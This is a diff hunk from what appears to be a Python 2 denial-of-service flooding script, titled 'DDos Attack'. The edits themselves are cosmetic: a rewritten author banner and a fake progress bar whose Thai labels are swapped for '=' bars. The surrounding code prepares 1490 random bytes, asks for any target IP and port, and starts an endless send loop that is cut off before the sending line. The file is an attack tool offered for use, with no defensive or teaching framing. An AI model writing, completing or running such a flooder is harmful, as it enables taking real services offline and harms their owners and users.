@@ -20,25 +20,25 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : ohm35057
-print "You Tube : เสือก
-print "github   : ohm35057
-print "Facebook : เสือก
+print "Author   : OHM-HACKER"
+print "You Tube : https://www.youtube.com"
+print "github   : https://github.com"
+print "Facebook : https://www.facebook.com"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[ อ่านหนังแปป                   ] 0% "
+print "[                    ] 0% "
 time.sleep(5)
-print "[       ไทย              ] 25%"
+print "[=====               ] 25%"
 time.sleep(5)
-print "[   Eng        ] 50%"
+print "[==========          ] 50%"
 time.sleep(5)
-print "[      วิทย์    ] 75%"
+print "[===============     ] 75%"
 time.sleep(5)
-print "[         คณิต      ] 100%"
+print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
